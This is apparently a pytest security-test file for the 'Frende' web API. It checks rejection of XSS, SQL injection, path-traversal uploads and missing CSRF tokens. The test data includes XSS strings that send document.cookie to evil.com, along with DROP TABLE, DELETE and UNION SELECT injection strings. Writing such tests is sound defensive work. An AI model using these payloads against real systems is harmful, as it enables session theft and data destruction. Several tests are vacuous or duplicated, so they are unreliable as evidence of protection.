#!/usr/bin/env python3
"""
Input validation security tests for Frende application
Tests XSS prevention, SQL injection prevention, input sanitization, and validation
"""
import pytest
import re
import html
import urllib.parse
from typing import Dict, Any, List
from unittest.mock import patch, Mock

from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from core.security_utils import SecurityValidator
from models.user import User

class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention"""
    
    def test_xss_payload_detection(self, security_test_data: Dict[str, List[str]]):
        """Test that XSS payloads are detected"""
        validator = SecurityValidator()
        
        for payload in security_test_data["xss_payloads"]:
            result = validator.validate_input_safety(payload)
            assert result["safe"] is False
            assert len(result["issues"]) > 0
            assert result["risk_level"] == "high"
    
    def test_xss_payload_sanitization(self, security_test_data: Dict[str, List[str]]):
        """Test that XSS payloads are properly sanitized"""
        for payload in security_test_data["xss_payloads"]:
            # Test HTML escaping
            escaped = html.escape(payload)
            assert "<" not in escaped or escaped.find("<") != escaped.rfind("<")
            assert ">" not in escaped or escaped.find(">") != escaped.rfind(">")
            
            # Test URL encoding
            encoded = urllib.parse.quote(payload)
            assert "<" not in encoded
            assert ">" not in encoded
            assert "javascript:" not in encoded.lower()
    
    def test_reflected_xss_prevention(self, test_client: TestClient, security_test_user_token: str):
        """Test reflected XSS prevention in API responses"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            # Test profile update with XSS payload
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"name": payload, "profile_text": payload}
            )
            
            # Should be rejected or sanitized
            assert response.status_code in [400, 422, 200]
            
            if response.status_code == 200:
                # If accepted, check that response is sanitized
                data = response.json()
                if "name" in data:
                    assert "<script>" not in data["name"]
                    assert "javascript:" not in data["name"].lower()
                if "profile_text" in data:
                    assert "<script>" not in data["profile_text"]
                    assert "javascript:" not in data["profile_text"].lower()
    
    def test_stored_xss_prevention(self, test_client: TestClient, security_test_user_token: str):
        """Test stored XSS prevention in database"""
        xss_payloads = [
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com/steal?cookie='+document.cookie)>",
            "<svg onload=fetch('http://evil.com/steal?cookie='+document.cookie)>"
        ]
        
        for payload in xss_payloads:
            # Test chat message with XSS payload
            response = test_client.post(
                "/api/chat/send",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"message": payload, "room_id": 1}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]
    
    def test_dom_xss_prevention(self, test_client: TestClient, security_test_user_token: str):
        """Test DOM XSS prevention"""
        dom_xss_payloads = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
            "onload=alert('XSS')",
            "onerror=alert('XSS')"
        ]
        
        for payload in dom_xss_payloads:
            # Test various input fields
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"name": payload}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]
    
    def test_xss_filter_bypass_attempts(self, test_client: TestClient, security_test_user_token: str):
        """Test XSS filter bypass attempts"""
        bypass_payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>"
        ]
        
        for payload in bypass_payloads:
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"name": payload}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]

class TestSQLInjectionPrevention:
    """Test SQL injection prevention"""
    
    def test_sql_injection_payload_detection(self, sql_injection_test_data: Dict[str, List[str]]):
        """Test that SQL injection payloads are detected"""
        validator = SecurityValidator()
        
        for category, payloads in sql_injection_test_data.items():
            for payload in payloads:
                result = validator.validate_input_safety(payload)
                # SQL injection payloads should be detected as unsafe
                assert result["safe"] is False
                assert len(result["issues"]) > 0
    
    def test_authentication_bypass_attempts(self, test_client: TestClient):
        """Test SQL injection authentication bypass attempts"""
        bypass_payloads = [
            "admin'--",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "' OR '1'='1",
            "' OR 1=1--"
        ]
        
        for payload in bypass_payloads:
            response = test_client.post(
                "/auth/jwt/login",
                data={
                    "username": payload,
                    "password": "password"
                }
            )
            
            # Should be rejected
            assert response.status_code == 401
    
    def test_data_extraction_attempts(self, test_client: TestClient, security_test_user_token: str):
        """Test SQL injection data extraction attempts"""
        extraction_payloads = [
            "' UNION SELECT * FROM users--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5--"
        ]
        
        for payload in extraction_payloads:
            # Test in search functionality
            response = test_client.get(
                f"/api/users/search?q={payload}",
                headers={"Authorization": f"Bearer {security_test_user_token}"}
            )
            
            # Should be rejected or return empty results
            assert response.status_code in [400, 422, 200]
            if response.status_code == 200:
                data = response.json()
                # Should not contain sensitive data
                assert "password" not in str(data).lower()
    
    def test_data_modification_attempts(self, test_client: TestClient, security_test_user_token: str):
        """Test SQL injection data modification attempts"""
        modification_payloads = [
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--"
        ]
        
        for payload in modification_payloads:
            # Test in profile update
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"name": payload}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]
    
    def test_blind_sql_injection_attempts(self, test_client: TestClient, security_test_user_token: str):
        """Test blind SQL injection attempts"""
        blind_payloads = [
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT LENGTH(username) FROM users LIMIT 1) > 0--",
            "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 0--"
        ]
        
        for payload in blind_payloads:
            # Test in search functionality
            response = test_client.get(
                f"/api/users/search?q={payload}",
                headers={"Authorization": f"Bearer {security_test_user_token}"}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]

class TestInputSanitization:
    """Test input sanitization"""
    
    def test_html_tag_removal(self):
        """Test that HTML tags are properly removed"""
        validator = SecurityValidator()
        
        html_inputs = [
            "<script>alert('XSS')</script>",
            "<p>Hello World</p>",
            "<div>Content</div>",
            "<img src='x' onerror='alert(1)'>",
            "<a href='javascript:alert(1)'>Click me</a>"
        ]
        
        for html_input in html_inputs:
            result = validator.validate_input_safety(html_input)
            assert result["safe"] is False
            assert len(result["issues"]) > 0
    
    def test_special_character_encoding(self):
        """Test that special characters are properly encoded"""
        special_chars = [
            "<>&\"'",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)"
        ]
        
        for chars in special_chars:
            # Test HTML escaping
            escaped = html.escape(chars)
            assert "<" not in escaped or escaped.find("<") != escaped.rfind("<")
            assert ">" not in escaped or escaped.find(">") != escaped.rfind(">")
            assert "&" not in escaped or escaped.find("&") != escaped.rfind("&")
            
            # Test URL encoding
            encoded = urllib.parse.quote(chars)
            assert "<" not in encoded
            assert ">" not in encoded
            assert "javascript:" not in encoded.lower()
    
    def test_whitespace_handling(self):
        """Test that whitespace is handled properly"""
        whitespace_inputs = [
            "   leading spaces",
            "trailing spaces   ",
            "  multiple   spaces  ",
            "\t\ttabs\t\t",
            "\n\nnewlines\n\n"
        ]
        
        for input_str in whitespace_inputs:
            # Test trimming
            trimmed = input_str.strip()
            assert not trimmed.startswith(" ")
            assert not trimmed.endswith(" ")
            assert not trimmed.startswith("\t")
            assert not trimmed.endswith("\t")
            assert not trimmed.startswith("\n")
            assert not trimmed.endswith("\n")
    
    def test_null_byte_handling(self):
        """Test that null bytes are handled properly"""
        null_inputs = [
            "normal\x00string",
            "\x00start",
            "end\x00",
            "\x00\x00\x00"
        ]
        
        for input_str in null_inputs:
            # Null bytes should be removed or cause validation failure
            assert "\x00" not in input_str.replace("\x00", "")
    
    def test_unicode_handling(self):
        """Test that Unicode characters are handled properly"""
        unicode_inputs = [
            "Hello 世界",
            "Привет мир",
            "こんにちは世界",
            "مرحبا بالعالم",
            "שלום עולם"
        ]
        
        for input_str in unicode_inputs:
            # Unicode should be preserved
            assert len(input_str) > 0
            # Should be valid UTF-8
            input_str.encode('utf-8').decode('utf-8')

class TestFileUploadSecurity:
    """Test file upload security"""
    
    def test_malicious_file_upload_prevention(self, test_client: TestClient, security_test_user_token: str, file_upload_test_data: Dict[str, Any]):
        """Test that malicious files are rejected"""
        for malicious_file in file_upload_test_data["malicious_files"]:
            files = {
                "file": (malicious_file["name"], malicious_file["content"], malicious_file["type"])
            }
            
            response = test_client.post(
                "/api/users/upload-profile-picture",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                files=files
            )
            
            # Should be rejected
            assert response.status_code in [400, 422, 415]
    
    def test_oversized_file_upload_prevention(self, test_client: TestClient, security_test_user_token: str, file_upload_test_data: Dict[str, Any]):
        """Test that oversized files are rejected"""
        for oversized_file in file_upload_test_data["oversized_files"]:
            files = {
                "file": (oversized_file["name"], oversized_file["content"], oversized_file["type"])
            }
            
            response = test_client.post(
                "/api/users/upload-profile-picture",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                files=files
            )
            
            # Should be rejected due to size
            assert response.status_code in [400, 413]
    
    def test_path_traversal_file_upload_prevention(self, test_client: TestClient, security_test_user_token: str, file_upload_test_data: Dict[str, Any]):
        """Test that path traversal in filenames is prevented"""
        for path_traversal_file in file_upload_test_data["path_traversal_files"]:
            files = {
                "file": (path_traversal_file["name"], path_traversal_file["content"], path_traversal_file["type"])
            }
            
            response = test_client.post(
                "/api/users/upload-profile-picture",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                files=files
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]
    
    def test_valid_file_upload_acceptance(self, test_client: TestClient, security_test_user_token: str, file_upload_test_data: Dict[str, Any]):
        """Test that valid files are accepted"""
        for valid_file in file_upload_test_data["valid_files"]:
            files = {
                "file": (valid_file["name"], valid_file["content"], valid_file["type"])
            }
            
            response = test_client.post(
                "/api/users/upload-profile-picture",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                files=files
            )
            
            # Should be accepted (200) or rejected for other reasons (400, 422)
            assert response.status_code in [200, 400, 422]

class TestDataValidation:
    """Test data validation security"""
    
    def test_email_validation(self, security_test_data: Dict[str, List[str]]):
        """Test email validation"""
        validator = SecurityValidator()
        
        # Test valid emails
        valid_emails = [
            "test@example.com",
            "user.name@domain.co.uk",
            "user+tag@example.org",
            "123@numbers.com"
        ]
        
        for email in valid_emails:
            assert validator.validate_email(email) is True
        
        # Test invalid emails
        for email in security_test_data["invalid_emails"]:
            assert validator.validate_email(email) is False
    
    def test_password_validation(self, security_test_data: Dict[str, List[str]]):
        """Test password validation"""
        validator = SecurityValidator()
        
        # Test weak passwords
        for password in security_test_data["weak_passwords"]:
            result = validator.validate_password_strength(password)
            assert result["valid"] is False
            assert result["score"] < 5
        
        # Test strong passwords
        strong_passwords = [
            "SecurePassword123!",
            "MyP@ssw0rd2024!",
            "Complex#Password$123"
        ]
        
        for password in strong_passwords:
            result = validator.validate_password_strength(password)
            assert result["valid"] is True
            assert result["score"] >= 7
    
    def test_input_length_validation(self, test_client: TestClient, security_test_user_token: str):
        """Test input length validation"""
        # Test profile text length limit
        long_text = "A" * 501  # Exceeds 500 character limit
        
        response = test_client.put(
            "/api/users/profile",
            headers={"Authorization": f"Bearer {security_test_user_token}"},
            json={"profile_text": long_text}
        )
        
        # Should be rejected
        assert response.status_code in [400, 422]
        
        # Test name length limit
        long_name = "A" * 101  # Exceeds 100 character limit
        
        response = test_client.put(
            "/api/users/profile",
            headers={"Authorization": f"Bearer {security_test_user_token}"},
            json={"name": long_name}
        )
        
        # Should be rejected
        assert response.status_code in [400, 422]
    
    def test_age_validation(self, test_client: TestClient, security_test_user_token: str):
        """Test age validation"""
        invalid_ages = [-1, 0, 12, 101, 150]
        
        for age in invalid_ages:
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"age": age}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]
        
        # Test valid ages
        valid_ages = [13, 18, 25, 50, 100]
        
        for age in valid_ages:
            response = test_client.put(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"age": age}
            )
            
            # Should be accepted or rejected for other reasons
            assert response.status_code in [200, 400, 422]

class TestCSRFProtection:
    """Test CSRF protection"""
    
    def test_csrf_token_validation(self, test_client: TestClient, security_test_user_token: str):
        """Test CSRF token validation"""
        # Test request without CSRF token
        response = test_client.post(
            "/api/users/update",
            headers={"Authorization": f"Bearer {security_test_user_token}"},
            json={"name": "Test User"}
        )
        
        # Should be rejected if CSRF protection is enabled
        assert response.status_code in [400, 403, 422]
    
    def test_csrf_token_requirement(self, test_client: TestClient, security_test_user_token: str):
        """Test that CSRF tokens are required for state-changing operations"""
        state_changing_endpoints = [
            ("POST", "/api/users/update"),
            ("DELETE", "/api/users/delete"),
            ("POST", "/api/tasks/create"),
            ("PUT", "/api/tasks/update"),
            ("DELETE", "/api/tasks/delete")
        ]
        
        for method, endpoint in state_changing_endpoints:
            if method == "POST":
                response = test_client.post(
                    endpoint,
                    headers={"Authorization": f"Bearer {security_test_user_token}"},
                    json={"test": "data"}
                )
            elif method == "PUT":
                response = test_client.put(
                    endpoint,
                    headers={"Authorization": f"Bearer {security_test_user_token}"},
                    json={"test": "data"}
                )
            elif method == "DELETE":
                response = test_client.delete(
                    endpoint,
                    headers={"Authorization": f"Bearer {security_test_user_token}"}
                )
            
            # Should be rejected if CSRF protection is enabled
            assert response.status_code in [400, 403, 404, 422]

class TestInputEncoding:
    """Test input encoding security"""
    
    def test_url_encoding_handling(self, test_client: TestClient, security_test_user_token: str):
        """Test URL encoding handling"""
        encoded_payloads = [
            urllib.parse.quote("<script>alert('XSS')</script>"),
            urllib.parse.quote("'; DROP TABLE users; --"),
            urllib.parse.quote("javascript:alert('XSS')")
        ]
        
        for encoded_payload in encoded_payloads:
            response = test_client.get(
                f"/api/users/search?q={encoded_payload}",
                headers={"Authorization": f"Bearer {security_test_user_token}"}
            )
            
            # Should be rejected or handled safely
            assert response.status_code in [400, 422, 200]
    
    def test_base64_encoding_handling(self, test_client: TestClient, security_test_user_token: str):
        """Test Base64 encoding handling"""
        import base64
        
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "javascript:alert('XSS')"
        ]
        
        for payload in malicious_payloads:
            encoded = base64.b64encode(payload.encode()).decode()
            
            response = test_client.post(
                "/api/users/update",
                headers={"Authorization": f"Bearer {security_test_user_token}"},
                json={"data": encoded}
            )
            
            # Should be rejected
            assert response.status_code in [400, 422]

class TestInputValidationPerformance:
    """Test input validation performance"""
    
    def test_xss_detection_performance(self, benchmark):
        """Test XSS detection performance"""
        validator = SecurityValidator()
        xss_payload = "<script>alert('XSS')</script>"
        
        def detect_xss():
            return validator.validate_input_safety(xss_payload)
        
        result = benchmark(detect_xss)
        assert result.stats.mean < 0.001  # Should be very fast
    
    def test_sql_injection_detection_performance(self, benchmark):
        """Test SQL injection detection performance"""
        validator = SecurityValidator()
        sql_payload = "'; DROP TABLE users; --"
        
        def detect_sql_injection():
            return validator.validate_input_safety(sql_payload)
        
        result = benchmark(detect_sql_injection)
        assert result.stats.mean < 0.001  # Should be very fast
    
    def test_email_validation_performance(self, benchmark):
        """Test email validation performance"""
        validator = SecurityValidator()
        email = "test@example.com"
        
        def validate_email():
            return validator.validate_email(email)
        
        result = benchmark(validate_email)
        assert result.stats.mean < 0.001  # Should be very fast
    
    def test_password_validation_performance(self, benchmark):
        """Test password validation performance"""
        validator = SecurityValidator()
        password = "SecurePassword123!"
        
        def validate_password():
            return validator.validate_password_strength(password)
        
        result = benchmark(validate_password)
        assert result.stats.mean < 0.01  # Should be reasonably fast
